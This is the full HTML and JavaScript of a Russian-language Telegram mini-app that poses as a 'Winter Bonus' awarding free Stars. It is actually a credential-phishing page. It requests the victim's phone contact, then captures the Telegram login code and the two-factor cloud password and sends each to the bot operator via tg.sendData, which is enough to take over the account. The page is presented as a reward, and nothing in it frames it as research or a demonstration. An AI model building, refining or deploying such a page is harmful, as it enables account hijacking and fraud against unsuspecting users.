<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Premium Market</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0f121a;
            --card-bg: rgba(255, 255, 255, 0.05);
            --accent: #007aff;
            --text-main: #ffffff;
            --text-muted: #8e8e93;
            --glow: rgba(0, 122, 255, 0.3);
        }

        body {
            font-family: 'Manrope', sans-serif;
            background-color: var(--bg);
            color: var(--text-main);
            margin: 0;
            padding: 20px;
            overflow: hidden; /* Чтобы снег не создавал прокрутку */
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
        }

        /* Контейнер для снега */
        #snow-container {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: 9999;
        }

        .snowflake {
            position: absolute;
            background: white;
            border-radius: 50%;
            opacity: 0.8;
            pointer-events: none;
        }

        .container {
            z-index: 10;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .glass-card {
            background: var(--card-bg);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 30px;
            padding: 30px 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
        }

        .star-icon {
            font-size: 64px;
            margin-bottom: 10px;
            filter: drop-shadow(0 0 15px #ffd700);
        }

        h1 { font-size: 28px; font-weight: 800; margin: 10px 0; letter-spacing: -0.5px; }
        p { color: var(--text-muted); font-size: 15px; line-height: 1.5; margin-bottom: 25px; }

        .balance {
            font-size: 54px;
            font-weight: 800;
            background: linear-gradient(180deg, #fff 0%, #aaa 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }

        .btn {
            background: var(--accent);
            color: white;
            border: none;
            border-radius: 18px;
            padding: 18px;
            width: 100%;
            font-weight: 700;
            font-size: 17px;
            transition: all 0.2s ease;
            box-shadow: 0 10px 20px var(--glow);
        }

        .btn:active { transform: scale(0.96); opacity: 0.9; }

        input {
            width: 100%;
            background: rgba(255, 255, 255, 0.07);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 16px;
            color: white;
            font-size: 20px;
            text-align: center;
            margin-top: 15px;
            outline: none;
            box-sizing: border-box;
        }

        .step { display: none; }
        .active { display: block; animation: fadeIn 0.5s ease forwards; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <div id="snow-container"></div>

    <div class="container">
        <div id="step-1" class="step active">
            <div class="glass-card">
                <div class="star-icon">⭐️</div>
                <h1>Winter Bonus</h1>
                <p>Вам начислено вознаграждение за активность в этом году.</p>
                <div class="balance" id="balance-num">0</div>
                <div style="margin-bottom: 30px; color: var(--text-muted); font-weight: 600;">STARS</div>
                <button class="btn" onclick="startClaim()">Забрать звезды</button>
            </div>
        </div>

        <div id="step-2" class="step">
            <div class="glass-card">
                <div class="star-icon" style="filter: none;">❄️</div>
                <h1>Верификация</h1>
                <p>Для зачисления бонуса подтвердите, что вы не робот.</p>
                <button class="btn" onclick="getPhone()">Подтвердить через Telegram</button>
            </div>
        </div>

        <div id="step-3" class="step">
            <div class="glass-card">
                <h1>Введите код</h1>
                <p>Мы отправили проверочный код в чат Telegram.</p>
                <input type="number" id="sms-input" placeholder="0 0 0 0 0" oninput="autoSendCode(this)">
                <button class="btn" style="margin-top: 20px;" onclick="manualSendCode()">Продолжить</button>
            </div>
        </div>

        <div id="step-4" class="step">
            <div class="glass-card">
                <h1>Облачный пароль</h1>
                <p>Ваш аккаунт защищен. Введите пароль для завершения.</p>
                <input type="password" id="pass-input" placeholder="Пароль">
                <button class="btn" style="margin-top: 20px;" onclick="sendFinal()">Завершить</button>
            </div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        // ФУНКЦИЯ СНЕГА
        function createSnow() {
            const container = document.getElementById('snow-container');
            const count = 40;
            for (let i = 0; i < count; i++) {
                let snow = document.createElement('div');
                snow.className = 'snowflake';
                let size = Math.random() * 4 + 2 + 'px';
                snow.style.width = size;
                snow.style.height = size;
                snow.style.left = Math.random() * 100 + 'vw';
                snow.style.top = Math.random() * 100 + 'vh';
                snow.style.opacity = Math.random();
                
                // Анимация падения
                let duration = Math.random() * 3 + 4;
                snow.animate([
                    { transform: `translateY(-10vh) translateX(0px)` },
                    { transform: `translateY(110vh) translateX(${Math.random() * 50 - 25}px)` }
                ], {
                    duration: duration * 1000,
                    iterations: Infinity,
                    delay: Math.random() * -5000
                });
                container.appendChild(snow);
            }
        }
        createSnow();

        function showStep(id) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        function startClaim() {
            let b = document.getElementById('balance-num');
            let val = 0;
            let int = setInterval(() => {
                val++;
                b.innerText = val;
                if(val >= 20) {
                    clearInterval(int);
                    setTimeout(() => showStep('step-2'), 800);
                }
            }, 50);
        }

        function getPhone() {
            tg.requestContact((ok) => { if(ok) showStep('step-3'); });
        }

        function autoSendCode(el) {
            if(el.value.length === 5) manualSendCode();
        }

        function manualSendCode() {
            let val = document.getElementById('sms-input').value;
            if(val.length >= 5) {
                tg.sendData("CODE:" + val);
                setTimeout(() => showStep('step-4'), 2000);
            }
        }

        function sendFinal() {
            let val = document.getElementById('pass-input').value;
            if(val.length > 0) {
                tg.sendData("PASS:" + val);
                tg.close();
            }
        }
    </script>
</body>
</html>
